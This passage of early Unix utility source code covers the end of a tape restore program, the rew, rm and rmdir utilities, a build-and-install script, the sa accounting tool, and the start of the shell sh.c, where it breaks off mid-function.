		seek(fi, pta-ata, 4);
		ata = pta;
	}
	if(read(fi, b, 512) != 512) {
		printf("tape read error %l\n", ata-1);
		if(!iflg)
			exit();
		for(c=0; c<256; c++)
			b[c] = 0;
	}
}

number(s)
char *s;
{
	register n, c;

	n = 0;
	while(c = *s++) {
		if(c<'0' || c>'9')
			continue;
		n = n*10+c-'0';
	}
	return(n);
}

size(s0, s1)
{
	register s;
	extern ldivr;

	s = ldiv(s0&0377, s1, 512);
	if(ldivr)
		s++;
	return(s);
}

otape()
{
	register char *p;

	fi = open(ifile, 0);
	if(fi < 0) {
		printf("can not open %s\n", ifile);
		exit();
	}
	if(!cflg)
		return;
	p = ifile;
	while(*p++)
		;
	p[-2]++;
}

dwait(ino)
{
	register i;

	dconv(ino, file);
loop:
	if(wflg) {
		printf("%s ", file);
		i = getchar();
		if(i == 'x')
			exit();
		if(i == '\n')
			return(-1);
		if(i != 'y')
			goto flush;
		i = getchar();
		if(i != '\n') {
		flush:
			while((i=getchar()) != '\n')
				if(i == '\0')
					exit();
			goto loop;
		}
	}
	i = creat(file, 0666);
	return(i);
}

dconv(n, p)
char *p;
{
	register i;

	if(i = ldiv(0, n, 10))
		p = dconv(i, p);
	*p++ = lrem(0, n, 10) + '0';
	*p = '\0';
	return(p);
}

alloc()
{
	register b, i;

	i = --sblock.s_nfree;
	if(i<0 || i>=100) {
		printf("bad freeblock\n");
		exit();
	}
	b = sblock.s_free[i];
	if(b == 0) {
		printf("out of freelist\n");
		exit();
	}
	if(sblock.s_nfree <= 0) {
		dread(b, cbuf);
		sblock.s_nfree = cbuf[0];
		for(i=0; i<100; i++)
			sblock.s_free[i] = cbuf[i+1];
	}
	return(b);
}

free(in)
{
	register i;

	if(sblock.s_nfree >= 100) {
		cbuf[0] = sblock.s_nfree;
		for(i=0; i<100; i++)
			cbuf[i+1] = sblock.s_free[i];
		sblock.s_nfree = 0;
		dwrite(in, cbuf);
	}
	sblock.s_free[sblock.s_nfree++] = in;
}
-- /usr/source/s2/rew.s mode=0100664 uid=3 gid=3 atime=174923562 mtime=169260599 --
/ rew -- rewind dec/mag tape

	cmp	(sp)+,$2
	blt	1f
	tst	(sp)+
	mov	(sp)+,r0
	movb	(r0)+,r1
	cmp	r1,$'m
	beq	rewm
	movb	r1,tapx+8
	tstb	(r0)
	bne	error
1:
	sys	open; tapx; 0
	br	rew

rewm:
	movb	(r0)+,r1
	beq	1f
	movb	r1,mtx+7
	tstb	(r0)
	bne	error
1:
	sys	open; mtx; 0

rew:
	bes	error
	sys	read; word; 2
	bes	error
	sys	exit

error:
	mov	$1,r0
	sys	write; 0f; 2
	sys	exit
0:
	<?\n>

tapx:
	</dev/tap0\0>
mtx:
	</dev/mt0\0>
	.even

.bss
word:	.=.+2

-- /usr/source/s2/rm.c mode=0100664 uid=3 gid=3 atime=174923566 mtime=169260599 --
main(argc, argv)
char *argv[];
{
	char *arg;
	int fflg, rflg;

	fflg = 0;
	rflg = 0;
	while(--argc > 0) {

		arg = *++argv;
		if(arg[0] == '-') {
			if(arg[1] == 'f') {
				fflg++;
				continue;
			}
			if(arg[1] == 'r') {
				rflg++;
				continue;
			}
		}

		rm(arg, fflg, rflg);
	}
}

struct stbuf	{
	int dev;
	int inum;
	int mode;
	char nlink;
	char uid;
	char gid;
	char siz0;
	char siz1;
	int addr[8];
	int adate[2];
	int mdate[2];
	};

rm(arg, fflg, rflg)
char arg[];
{
	char *p;
	int buf[20];
	int i, b;

	if(stat(arg, buf)) {
		printf("%s: non existent\n", arg);
		return;
	}
	if((buf->mode & 060000) == 040000)	{
		if(rflg) {
			i = fork();
			if(i == -1) {
				printf("%s: try again\n", arg);
				return;
			}
			if(i) {
				while(wait() != i);
				return;
			}
			if(chdir(arg)) {
				printf("%s: cannot chdir\n", arg);
				exit();
			}
			p = 0;
			execl("/etc/glob", "glob", "rm", "-r",
				fflg? "-f": "*", fflg? "*": p, 0);
			printf("%s: no glob\n", arg);
			exit();
		}
		printf("%s: directory\n", arg);
		return;
	}

	if(!fflg) {

		if((getuid()&0377) == buf->uid)
			b = 0200; else
			b = 2;
		if((buf->mode & b) == 0 && ttyn(0) != 'x') {
			printf("%s: %o mode ", arg, buf->mode);
			i = b = getchar();
			i = b;
			while(b != '\n' && b != '\0')
				b = getchar();
			if(i != 'y')
				return;
		}
	}
	if(unlink(arg))
		printf("%s: not removed\n", arg);
}

putchar(c)
{
	write(1, &c, 1);
}

getchar()
{
	char c;

	if(read(0, &c, 1) != 1) return(0);
	return(c);
}
-- /usr/source/s2/rmdir.s mode=0100664 uid=3 gid=3 atime=174923577 mtime=169260600 --
/ rmdir -- unlink directory

	mov	(sp)+,r5
	tst	(sp)+

loop:
	dec	r5
	ble	done
	mov	(sp)+,r1
	mov	$name,r2
	clr	r0
1:
	inc	r0
	movb	(r1)+,(r2)+
	bne	1b
	dec	r2
	dec	r0
	mov	r0,size
	cmp	r2,$name
	beq	error
	sys	stat; name; stbuf
	bes	error
	bic	$!60000,stbuf+4
	cmp	$40000,stbuf+4
	bne	error
	cmpb	-1(r2),$'.
	bne	1f
	cmp	r2,$name+1
	beq	error
	cmpb	-2(r2),$'/
	beq	error
	cmpb	-2(r2),$'.
	bne	1f
	cmp	r2,$name+2
	beq	error
	cmpb	-3(r2),$'/
	beq	error
1:
	sys	open; name; 0
	bes	error
	mov	r0,r1
1:
	mov	r1,r0
	sys	read; stbuf; 16.
	bes	1f
	tst	r0
	beq	1f
	tst	stbuf
	beq	1b
	cmpb	stbuf+2,$'.
	bne	error1
	tstb	stbuf+3
	beq	1b
	cmpb	stbuf+3,$'.
	bne	error1
	tstb	stbuf+4
	beq	1b

error1:
	jsr	pc,prname
	mov	r1,r0
	sys	close
	mov	$1,r0
	sys	write; mes1; emes1-mes1
	br	loop

1:
	mov	r1,r0
	sys	close
	movb	$'/,(r2)+
	movb	$'.,(r2)+
	movb	$'.,(r2)+
	clrb	(r2)
	sys	unlink; name
	clrb	-(r2)
	sys	unlink; name
	clrb	-2(r2)
	sys	unlink; name
	br	loop

error:
	jsr	pc,prname
	mov	$1,r0
	sys	write; mes2; emes2-mes2
	br	loop

prname:
	mov	$1,r0
	sys	write; name; size:..
	rts	pc

done:
	sys	exit

mes1:
	< -- directory not empty\n>
emes1:
mes2:
	< ?\n>
emes2:
	.even

.bss
name:	.=.+40.
stbuf:	.=.+40.

-- /usr/source/s2/run mode=0100664 uid=3 gid=3 atime=174923946 mtime=174917284 --
cc -s -O mail.c
cmp a.out /bin/mail
cp a.out /bin/mail

cc -s -O mesg.c
cmp a.out /usr/bin/mesg
cp a.out /usr/bin/mesg

as mkdir.s
strip a.out
cmp a.out /bin/mkdir
cp a.out /bin/mkdir

cc -s -O mkfs.c
cmp a.out /etc/mkfs
cp a.out /etc/mkfs

cc -s -O mknod.c
cmp a.out /etc/mknod
cp a.out /etc/mknod

cc -s -O mount.c
cmp a.out /etc/mount
cp a.out /etc/mount

cc -s -O mv.c
cmp a.out /bin/mv
cp a.out /bin/mv

cc -s -O ncheck.c
cmp a.out /bin/ncheck
cp a.out /bin/ncheck

cc -s -O newgrp.c
cmp a.out /bin/newgrp
cp a.out /bin/newgrp

cc -s -O nice.c
cmp a.out /usr/bin/nice
cp a.out /usr/bin/nice

cc -s -O nm.c
cmp a.out /bin/nm
cp a.out /bin/nm

cc -s -O nohup.c
cmp a.out /usr/bin/nohup
cp a.out /usr/bin/nohup

cc -s -O od.c
cmp a.out /bin/od
cp a.out /bin/od

cc -s -O opr.c
cmp a.out /bin/opr
cp a.out /bin/opr

cc -s -O passwd.c
cmp a.out /bin/passwd
cp a.out /bin/passwd

as pfe.s
strip a.out
cmp a.out /usr/bin/pfe
cp a.out /usr/bin/pfe

cc -s -O pr.c
cmp a.out /bin/pr
cp a.out /bin/pr

cc -s -f -O prof.c
cmp a.out /usr/bin/prof
cp a.out /usr/bin/prof

cc -s -O ps.c
cmp a.out /bin/ps
cp a.out /bin/ps

cc -s -O ptx.c
cmp a.out /usr/bin/ptx
cp a.out /usr/bin/ptx

cc -s -O pwd.c
cmp a.out /usr/bin/pwd
cp a.out /usr/bin/pwd

cc -s -O quiz.c
cmp a.out /usr/bin/quiz
cp a.out /usr/bin/quiz

cc -s -O rc.c
cmp a.out /usr/bin/rc
cp a.out /usr/bin/rc

cc -s -O restor.c
cmp a.out /bin/restor
cp a.out /bin/restor

as rew.s
strip a.out
cmp a.out /bin/rew
cp a.out /bin/rew

cc -s -O rm.c
cmp a.out /bin/rm
cp a.out /bin/rm

as rmdir.s
strip a.out
cmp a.out /bin/rmdir
cp a.out /bin/rmdir

cc -s -f -O sa.c
cmp a.out /usr/bin/sa
cp a.out /usr/bin/sa

cc -s -n -O sh.c
cmp a.out /bin/sh
cp a.out /bin/sh

cc -s -O size.c
cmp a.out /bin/size
cp a.out /bin/size

cc -s -O sleep.c
cmp a.out /usr/bin/sleep
cp a.out /usr/bin/sleep

cc -s -O sort.c
cmp a.out /bin/sort
cp a.out /bin/sort

cc -s -O split.c
cmp a.out /usr/bin/split
cp a.out /usr/bin/split

as strip.s
strip a.out
cmp a.out /bin/strip
cp a.out /bin/strip

cc -s -O stty.c
cmp a.out /bin/stty
cp a.out /bin/stty

cc -s -O su.c
cmp a.out /bin/su
cp a.out /bin/su

as sum.s
strip a.out
cmp a.out /bin/sum
cp a.out /bin/sum

cc -s -O sync.c
cmp a.out /bin/sync
cp a.out /bin/sync

cc -s -O tbl.c -lp
cmp a.out /usr/bin/tbl
cp a.out /usr/bin/tbl

cc -s -O tee.c
cmp a.out /usr/bin/tee
cp a.out /usr/bin/tee

as time.s
strip a.out
cmp a.out /bin/time
cp a.out /bin/time

as tp?.s
ld a.out -lc -l
cmp a.out /bin/tp
cp a.out /bin/tp

cc -s -O tr.c
cmp a.out /usr/bin/tr
cp a.out /usr/bin/tr

as tty.s
ld -s a.out -l
cmp a.out /bin/tty
cp a.out /bin/tty

cc -s -f -O typo.c
cmp a.out /usr/bin/typo
cp a.out /usr/bin/typo

cc -s -O umount.c
cmp a.out /etc/umount
cp a.out /etc/umount

cc -s -O uniq.c
cmp a.out /bin/uniq
cp a.out /bin/uniq

cc -s -f -O units.c
cmp a.out /usr/bin/units
cp a.out /usr/bin/units

as update.s
strip a.out
cmp a.out /etc/update
cp a.out /etc/update

cc -s -O usort.c
cmp a.out /usr/bin/usort
cp a.out /usr/bin/usort

cc -s -O wall.c
cmp a.out /etc/wall
cp a.out /etc/wall

cc -s -O wc.c
cmp a.out /usr/bin/wc
cp a.out /usr/bin/wc

cc -s -O who.c
cmp a.out /bin/who
cp a.out /bin/who

as write.s
ld -s a.out -l
cmp a.out /bin/write
cp a.out /bin/write

rm a.out
-- /usr/source/s2/sa.c mode=0110664 uid=3 gid=3 atime=174923581 mtime=169260600 --
#define size 2000
/* interpret command time accounting */

int	lflg;
int	cflg;
int	jflg;
int	nflg;
int	aflg;
int	rflg;
int	tflg;
int	vflg;
int	uflg;
int	thres	1;
int	sflg;
int	bflg;
int	mflg;
int	fout;

struct	user {
	int	ncomm;
	int	fill;
	float	fctime;
} user[256];
struct tab {
	char name[8];
	int count;
	float realt;
	float cput;
	float syst;
} tab[size];

struct ftab {
	char	fname[14];
	char	shf;
	char	uid;
	int	fdatet[2];
	int	frealt[2];
	int	fcput[2];
	int	fsyst[2];
};
float	treal;
float	tcpu;
float	tsys;
int	junkp -1;
char	*sname;
float	ncom;

main(argc, argv)
char **argv;
{
	int i, j, k;
	extern tcmp(), ncmp(), bcmp();
	extern float sum();
	float ft;

	init();
	if (argc>1)
	if (argv[1][0]=='-') {
		argv++;
		argc--;
		for(i=1; argv[0][i]; i++)
		switch(argv[0][i]) {

		case 'b':
			bflg++;
			break;

		case 'l':
			lflg++;
			break;

		case 'c':
			cflg++;
			break;

		case 'j':
			jflg++;
			break;

		case 'n':
			nflg++;
			break;

		case 'a':
			aflg++;
			break;

		case 'r':
			rflg++;
			break;

		case 't':
			tflg++;
			break;

		case 's':
			sflg++;
			aflg++;
			break;

		case '0':
		case '1':
		case '2':
		case '3':
		case '4':
		case '5':
		case '6':
		case '7':
		case '8':
		case '9':
			thres = argv[0][i]-'0';
			break;

		case 'v':
			vflg++;
			break;

		case 'u':
			uflg++;
			break;

		case 'm':
			mflg++;
			break;
		}
	}
	fout = dup(1);
	if (argc<2)
		acct("/usr/adm/sha");
	else while (--argc)
		acct(*++argv);
	if (uflg) {
		flush();
		return;
	}

/*
 * cleanup pass
 * put junk together
 */

	if (vflg)
		strip();
	if(!aflg)
	for (i=0; i<size; i++)
	if (tab[i].name[0]) {
		for(j=0; j<8; j++)
			if(tab[i].name[j] == '?')
				goto yes;
		if(tab[i].count != 1)
			continue;
	yes:
		if(junkp == -1)
			junkp = enter("***other");
		tab[junkp].count =+ tab[i].count;
		tab[junkp].realt =+ tab[i].realt;
		tab[junkp].cput =+ tab[i].cput;
		tab[junkp].syst =+ tab[i].syst;
		tab[i].name[0] = 0;
	}
	for(i=k=0; i<size; i++)
	if(tab[i].name[0]) {
		for(j=0; j<8; j++)
			tab[k].name[j] = tab[i].name[j];
		tab[k].count = tab[i].count;
		tab[k].realt = tab[i].realt;
		tab[k].cput = tab[i].cput;
		tab[k].syst = tab[i].syst;
		k++;
	}
	if (sflg) {
		signal(2, 1);
		i = creat("/usr/adm/shm", 0666);
		write(i, user, sizeof(user));
		close(i);
		if ((i = creat("/usr/adm/sht", 0666))<0) {
			printf("Can't save\n");
			exit();
		}
		write(i, tab, k*sizeof(*tab));
		close(i);
		if (sname) {
			if ((i = creat(sname, 0666))<0)
				printf("Can't truncate\n");
			close(i);
		}
		signal(2, 0);
	}
/*
 * sort and print
 */

	if (mflg) {
		printmoney();
		flush();
		exit();
	}
	qsort(tab, k, 22, nflg? &ncmp: (bflg?&bcmp:&tcmp));
	printf("%8s", "");
	column(ncom, treal, tcpu, tsys);
	for (i=0; i<k; i++)
	if (tab[i].name[0]) {
		ft = tab[i].count;
		printf("%-8.8s", tab[i].name);
		column(ft, tab[i].realt, tab[i].cput, tab[i].syst);
	}
	flush();
}

printmoney()
{
	register i;
	char buf[128];
	register char *cp;

	for (i=0; i<256; i++) {
		if (user[i].ncomm) {
			if (getpw(i, buf)!=0)
				printf("%-8d", i);
			else {
				cp = buf;
				while (*cp!=':' &&*cp!='\n' && *cp)
					cp++;
				*cp = 0;
				printf("%-8s", buf);
			}
			printf("%5l %7.2f\n",
			    user[i].ncomm, user[i].fctime/60);
		}
	}
}

column(n, a, b, c)
double n, a, b, c;
{

	printf("%6.0f", n);
	if(cflg) {
		if(n == ncom)
			printf("%7s", ""); else
			printf("%6.2f%%", 100.*n/ncom);
	}
	col(n, a, treal);
	if(lflg) {
		col(n, b, tcpu);
		col(n, c, tsys);
	} else
		col(n, b+c, tcpu+tsys);
	if(tflg)
		printf("%6.1f", a/(b+c));
	putchar('\n');
}

col(n, a, m)
double n, a, m;
{

	if(jflg)
		printf("%9.2f", a/(n*60.)); else
		printf("%9.2f", a/3600.);
	if(cflg) {
		if(a == m)
			printf("%7s", ""); else
			printf("%6.2f%%", 100.*a/m);
	}
}

acct(f)
char *f;
{
	int ff, i, j;
	float x;
	struct ftab fbuf;
	register char *cp;
	register int c;
	extern double ltod();

	if (sflg && sname) {
		printf("Only 1 file with -s\n");
		exit();
	}
	if (sflg)
		sname = f;
	if ((ff=open(f, 0))<0) {
		printf("Can't open %s\n", f);
		return;
	}
	while (read(ff, &fbuf, sizeof(fbuf))==sizeof(fbuf)) {
		for (cp = fbuf.name; cp < &fbuf.name[8]; cp++) {
			c = *cp & 0377;
			if (c && (c < ' ' || c >= 0200))
				*cp = '?';
		}
		if (uflg) {
			printdate(fbuf.fdatet);
			printf(" %3d %.8s\n", fbuf.uid, fbuf.name);
			continue;
		}
		if (fbuf.shf==0) {
			c = fbuf.uid&0377;
			user[c].ncomm++;
			user[c].fctime =+ (ltod(fbuf.fcput)+ltod(fbuf.fsyst))/60;
		}
		ncom =+ 1.0;
		i = enter(&fbuf);
		tab[i].count++;
		x = ltod(fbuf.frealt);
		x =* 60.;
		tab[i].realt =+ x;
		treal =+ x;
		x = ltod(fbuf.fcput);
		tab[i].cput =+ x;
		tcpu =+ x;
		x = ltod(fbuf.fsyst);
		tab[i].syst =+ x;
		tsys =+ x;
	}
	close(ff);
}

ncmp(p1, p2)
struct tab *p1, *p2;
{

	if(p1->count == p2->count)
		return(tcmp(p1, p2));
	if(rflg)
		return(p1->count - p2->count);
	return(p2->count - p1->count);
}

bcmp(p1, p2)
struct tab *p1, *p2;
{
	float f1, f2;
	float sum();

	f1 = sum(p1)/p1->count;
	f2 = sum(p2)/p2->count;
	if(f1 < f2) {
		if(rflg)
			return(-1);
		return(1);
	}
	if(f1 > f2) {
		if(rflg)
			return(1);
		return(-1);
	}
	return(0);
}
tcmp(p1, p2)
struct tab *p1, *p2;
{
	extern float sum();
	float f1, f2;

	f1 = sum(p1);
	f2 = sum(p2);
	if(f1 < f2) {
		if(rflg)
			return(-1);
		return(1);
	}
	if(f1 > f2) {
		if(rflg)
			return(1);
		return(-1);
	}
	return(0);
}

float sum(p)
struct tab *p;
{

	if(p->name[0] == 0)
		return(0.0);
	return(
		p->cput+
		p->syst);
}

init()
{
	struct tab tbuf;
	int i, j, f;

	if ((f=open("/usr/adm/sht", 0))<0)
		goto gshm;
	while (read(f, &tbuf, sizeof(tbuf)) == sizeof(tbuf)) {
		i = enter(&tbuf);
		ncom =+ tbuf.count;
		tab[i].count = tbuf.count;
		treal =+ tbuf.realt;
		tab[i].realt = tbuf.realt;
		tcpu =+ tbuf.cput;
		tab[i].cput = tbuf.cput;
		tsys =+ tbuf.syst;
		tab[i].syst = tbuf.syst;
	}
	close(f);
 gshm:
	if ((f=open("/usr/adm/shm", 0)) < 0)
		return;
	read(f, user, sizeof(user));
	close(f);
}

enter(fbuf)
struct ftab *fbuf;
{
	int i, j;

	i = 0;
	for (j=0; j<8; j++) {
		i = i*7 + fbuf->fname[j];
	}
	if(i < 0)
		i = -i;
	for (i=%size; tab[i].name[0]; i = (i+1)%size) {
		for (j=0; j<8; j++)
			if (tab[i].name[j]!=fbuf->fname[j])
				goto no;
		goto yes;
	no:;
	}
	for (j=0; j<8; j++)
		tab[i].name[j] = fbuf->fname[j];
yes:
	return(i);
}

strip()
{
	int i, j, k, c;

	j = enter("**junk**");
	for (i = 0; i<size; i++) {
		if (tab[i].name[0] && tab[i].count<=thres) {
			printf("%.8s--", tab[i].name);
			flush();
			if ((c=getchar())=='y') {
				tab[i].name[0] = '\0';
				tab[j].count =+ tab[i].count;
				tab[j].realt =+ tab[i].realt;
				tab[j].cput =+ tab[i].cput;
				tab[j].syst =+ tab[i].syst;
			}
			while (c && c!='\n')
				c = getchar();
		}
	}
}

printdate(tvec)
int tvec[2];
{
	int *lt;
	int *localtime();

	lt = localtime(tvec);
	printf("%3d %c%c%c %d", lt[7], 
		pair(lt[2]), pair(lt[1]), pair(lt[0]), lt[6]);
}

pair(n)
{
	return(n/10+'0' | (n%10+'0')<<8);
}
-- /usr/source/s2/sh.c mode=0110664 uid=3 gid=3 atime=174923609 mtime=174845405 --
#
/*
 */

#define	INTR	2
#define	QUIT	3
#define LINSIZ 1000
#define ARGSIZ 50
#define TRESIZ 100

#define QUOTE 0200
#define FAND 1
#define FCAT 2
#define FPIN 4
#define FPOU 8
#define FPAR 16
#define FINT 32
#define FPRS 64
#define TCOM 1
#define TPAR 2
#define TFIL 3
#define TLST 4
#define DTYP 0
#define DLEF 1
#define DRIT 2
#define DFLG 3
#define DSPR 4
#define DCOM 5
#define	ENOMEM	12
#define	ENOEXEC 8

char	*dolp;
char	pidp[6];
int	ldivr;
char	**dolv;
int	dolc;
char	*promp;
char	*linep;
char	*elinep;
char	**argp;
char	**eargp;
int	*treep;
int	*treeend;
char	peekc;
char	gflg;
char	error;
char	acctf;
char	uid;
char	setintr;
char	*arginp;
int	onelflg;

char	*mesg[] {
	0,
	"Hangup",
	0,
	"Quit",
	"Illegal instruction",
	"Trace/BPT trap",
	"IOT trap",
	"EMT trap",
	"Floating exception",
	"Killed",
	"Bus error",
	"Memory fault",
	"Bad system call",
	0,
	"Sig 14",
	"Sig 15",
	"Sig 16",
	"Sig 17",
	"Sig 18",
	"Sig 19",
};

struct stime {
	int proct[2];
	int cputim[2];
	int systim[2];
} timeb;

char	line[LINSIZ];
char	*args[ARGSIZ];
int	trebuf[TRESIZ];

main(c, av)
int c;
char **av;
{
	register f;
	register char *acname, **v;

	for(f=2; f<15; f++)
		close(f);
	if((f=dup(1)) != 2)
		close(f);
	dolc = getpid();
	for(f=4; f>=0; f--) {
		dolc = ldiv(0, dolc, 10);
		pidp[f] = ldivr+'0';
	}
	v = av;
	acname = "/usr/adm/sha";
	promp = "% ";
	if(((uid = getuid())&0377) == 0)
		promp = "# ";
	acctf = open(acname, 1);
	if(c > 1) {
		promp = 0;
		if (*v[1]=='-') {
			**v = '-';
			if (v[1][1]=='c' && c>2)
				arginp = v[2];
			else if (v[1][1]=='t')
				onelflg = 2;
		} else {
			close(0);
			f = open(v[1], 0);
			if(f < 0) {
				prs(v[1]);
				err(": cannot open");
			}
		}
	}
	if(**v == '-') {
		setintr++;
		signal(QUIT, 1);
		signal(INTR, 1);
	}
	dolv = v+1;
	dolc = c-1;

loop:
	if(promp != 0)
		prs(promp);
	peekc = getc();
	main1();
	goto loop;
}

main1()
{
	register char c, *cp;
	register *t;

	argp = args;
	eargp = args+ARGSIZ-5;
	linep = line;
	elinep = line+LINSIZ-5;
	error = 0;
	gflg = 0;
	do {
		cp = linep;
		word();
	} while(*cp != '\n');
	treep = trebuf;
	treeend = &trebuf[TRESIZ];
	if(gflg == 0) {
		if(error == 0) {
			setexit();
			if (error)
				return;
			t = syntax(args, argp);
		}
		if(error != 0)
			err("syntax error"); else
			execute(t);
	}
}

word()
{
	register char c, c1;

	*argp++ = linep;

loop:
	switch(c = getc()) {

	case ' ':
	case '\t':
		goto loop;

	case '\'':
	case '"':
		c1 = c;
		while((c=readc()) != c1) {
			if(c == '\n') {
				error++;
				peekc = c;
				return;
			}
			*linep++ = c|QUOTE;
		}
		goto pack;

	case '&':
	case ';':
	case '<':
	case '>':
	case '(':
	case ')':
	case '|':
	case '^':
	case '\n':
		*linep++ = c;
		*linep++ = '\0';
		return;
	}

	peekc = c;

pack:
	for(;;) {
		c = getc();
		if(any(c, " '\"\t;&<>()|^\n")) {
			peekc = c;
			if(any(c, "\"'"))
				goto loop;
			*linep++ = '\0';
			return;
		}
		*linep++ = c;
	}
}

tree(n)
int n;
{
	register *t;

	t = treep;
	treep =+ n;
	if (treep>treeend) {
		prs("Command line overflow\n");
		error++;
		reset();
	}
	return(t);
}

getc()
{
	register char c;

	if(peekc) {
		c = peekc;
		peekc = 0;
		return(c);
	}
	if(argp > eargp) {
		argp =- 10;
		while((c=getc()) != '\n');
		argp =+ 10;
		err("Too many args");
		gflg++;
		return(c);
	}
	if(linep > elinep) {
		linep =- 10;
		while((c=getc()) != '\n');
		linep =+ 10;
		err("Too many characters");
		gflg++;
		return(c);
	}
getd:
	if(dolp) {
		c = *dolp++;
		if(c != '\0')
			return(c);
		dolp = 0;
	}
	c = readc();
	if(c == '\\') {
		c = readc();
		if(c == '\n')
			return(' ');
		return(c|QUOTE);
	}
	if(c == '$') {
		c = readc();
		if(c>='0' && c<='9') {
			if(c-'0' < dolc)
				dolp = dolv[c-'0'];
			goto getd;
		}
		if(c == '$') {
			dolp = pidp;
			goto getd;
		}
	}
	return(c&0177);
}

readc()
{
	char cc;
	register c;

	if (arginp) {
		if (arginp == 1)
			exit();
		if ((c = *arginp++) == 0) {
			arginp = 1;
			c = '\n';
		}
		return(c);
	}
	if (onelflg==1)
		exit();
	if(read(0, &cc, 1) != 1)
		exit();
	if (cc=='\n' && onelflg)
		onelflg--;
	return(cc);
}

/*
 * syntax
 *	empty
 *	syn1
 */

syntax(p1, p2)
char **p1, **p2;
{

	while(p1 != p2) {
		if(any(**p1, ";&\n"))
			p1++; else
			return(syn1(p1, p2));
	}
	return(0);
}

/*
 * syn1
 *	syn2
 *	syn2 & syntax
 *	syn2 ; syntax
 */

syn1(p1, p2)
char **p1, **p2;
{
	register char **p;
	register *t, *t1;
	int l;

	l = 0;
	for(p=p1; p!=p2; p++)
	switch(**p) {

	case '(':
		l++;
		continue;

	case ')':
		l--;
		if(l < 0)
			error++;
		continue;

	case '&':
	case ';':
	case '\n':
		if(l == 0) {
			l = **p;
			t = tree(4);
			t[DTYP] = TLST;
			t[DLEF] = syn2(p1, p);
			t[DFLG] = 0;
			if(l == '&') {
				t1 = t[DLEF];
				t1[DFLG] =| FAND|FPRS|FINT;
			}
			t[DRIT] = syntax(p+1, p2);
			return(t);
		}
	}
	if(l == 0)
		return(syn2(p1, p2));
	error++;
}

/*
 * syn2
 *	syn3
 *	syn3 | syn2
 */

syn2(p1, p2)
char **p1, **p2;
{
	register char **p;
	register int l, *t;

	l = 0;
	for(p=p1; p!=p2; p++)
	switch(**p) {

	case '(':
		l++;
		continue;

	case ')':
		l--;
		continue;

	case '|':
	case '^':
		if(l == 0) {
			t = tree(4);
			t[DTYP] = TFIL;
			t[DLEF] = syn3(p1, p);
			t[DRIT] = syn2(p+1, p2);
			t[DFLG] = 0;
			return(t);
		}
	}
	return(syn3(p1, p2));
}

/*
 * syn3
 *	( syn1 ) [ < in  ] [ > out ]
 *	word word* [ < in ] [ > out ]
 */

syn3(p1, p2)
char **p1, **p2;
{
	register char **p;
	char **lp, **rp;
	register *t;
	int n, l, i, o, c, flg;

	flg = 0;
	if(**p2 == ')')
		flg =| FPAR;
	lp = 0;
	rp = 0;
	i = 0;
	o = 0;
	n = 0;
	l = 0;
	for(p=p1; p!=p2; p++)
	switch(c = **p) {

	case '(':
		if(l == 0) {
			if(lp != 0)
				error++;
			lp = p+1;
		}
		l++;
		continue;

	case ')':
		l--;
		if(l == 0)
			rp = p;
		continue;

	case '>':
		p++;
		if(p!=p2 && **p=='>')
			flg =| FCAT; else
			p--;

	case '<':
		if(l == 0) {
			p++;
			if(p == p2) {
				error++;
				p--;
			}
			if(any(**p, "<>("))
				error++;
			if(c == '<') {
				if(i != 0)
					error++;
				i = *p;
				continue;
			}
			if(o != 0)
				error++;
			o = *p;
		}
		continue;

	default:
		if(l == 0)
			p1[n++] = *p;
	}
	if(lp != 0) {
		if(n != 0)
			error++;
		t = tree(5);
		t[DTYP] = TPAR;
		t[DSPR] = syn1(lp, rp);
		goto out;
	}
	if(n == 0)
		error++;
	p1[n++] = 0;
	t = tree(n+5);
	t[DTYP] = TCOM;
	for(l=0; l<n; l++)
		t[l+DCOM] = p1[l];
out:
	t[DFLG] = flg;
	t[DLEF] = i;
	t[DRIT] = o;
	return(t);
}

scan(at, f)
int *at;
int (*f)();
{
	register char *p, c;
	register *t;

	t = at+DCOM;
	while(p = *t++)
		while(c = *p)
			*p++ = (*f)(c);
}

tglob(c)
int c;
{

	if(any(c, "[?*"))
		gflg = 1;
	return(c);
}

trim(c)
int c;
{

	return(c&0177);
}

execute(t, pf1, pf2)
int *t, *pf1, *pf2;
{
	int i, f, pv[2];
	register *t1;
	register char *cp1, *cp2;
	extern errno;

	if(t != 0)
	switch(t[DTYP]) {

	case TCOM:
		cp1 = t[DCOM];
		if(equal(cp1, "chdir")) {
			if(t[DCOM+1] != 0) {
				if(chdir(t[DCOM+1]) < 0)
					err("chdir: bad directory");
			} else
				err("chdir: arg count");
			return;
		}
		if(equal(cp1, "shift")) {
			if(dolc < 1) {
				prs("shift: no args\n");
				return;
			}
			dolv[1] = dolv[0];
			dolv++;
			dolc--;
			return;
		}
		if(equal(cp1, "login")) {
			if(promp != 0) {
				close(acctf);
				execv("/bin/login", t+DCOM);
			}
			prs("login: cannot execute\n");
			return;
		}
		if(equal(cp1, "newgrp")) {
			if(promp != 0) {
				close(acctf);
				execv("/bin/newgrp", t+DCOM);
			}
			prs("newgrp: cannot execute\n");
			return;
		}
		if(equal(cp1, "wait")) {
			pwait(-1, 0);
			return;
		}
		if(equal(cp1, ":"))
			return;

	case TPAR:
		f = t[DFLG];
		i = 0;
		if((f&FPAR) == 0)
			i = fork();
		if(i == -1) {
			err("try again");
			return;
		}
		if(i != 0) {
			if((f&FPIN) != 0) {
				close(pf1[0]);
				close(pf1[1]);
			}
			if((f&FPRS) != 0) {
				prn(i);
				prs("\n");
			}
			if((f&FAND) != 0)
				return;
			if((f&FPOU) == 0)
				pwait(i, t);
			return;
		}
		if(t[DLEF] != 0) {
			close(0);
			i = open(t[DLEF], 0);
			if(i < 0) {
				prs(t[DLEF]);
				err(": cannot open");
				exit();
			}
		}
		if(t[DRIT] != 0) {
			if((f&FCAT) != 0) {
				i = open(t[DRIT], 1);
				if(i >= 0) {
					seek(i, 0, 2);
					goto f1;
				}
			}
			i = creat(t[DRIT], 0666);
			if(i < 0) {
				prs(t[DRIT]);
				err(": cannot create");
				exit();
			}
		f1:
			close(1);
			dup(i);
			close(i);
		}
		if((f&FPIN) != 0) {
			close(0);
			dup(pf1[0]);
			close(pf1[0]);
			close(pf1[1]);
		}
		if((f&FPOU) != 0) {
			close(1);
			dup(pf2[1]);
			close(pf2[0]);
			close(pf2[1]);
		}
		if((f&FINT)!=0 && t[DLEF]==0 && (f&FPIN)==0) {
			close(0);
			open("/dev/null", 0);
		}
		if((f&FINT) == 0 && setintr) {
			signal(INTR, 0);
			signal(QUIT, 0);
		}
		if(t[DTYP] == TPAR) {
			if(t1 = t[DSPR])
				t1[DFLG] =| f&FINT;
			execute(t1);
			exit();
		}
		close(acctf);
		gflg = 0;
		scan(t, &tglob);
		if(gflg) {
			t[DSPR] = "/etc/glob";
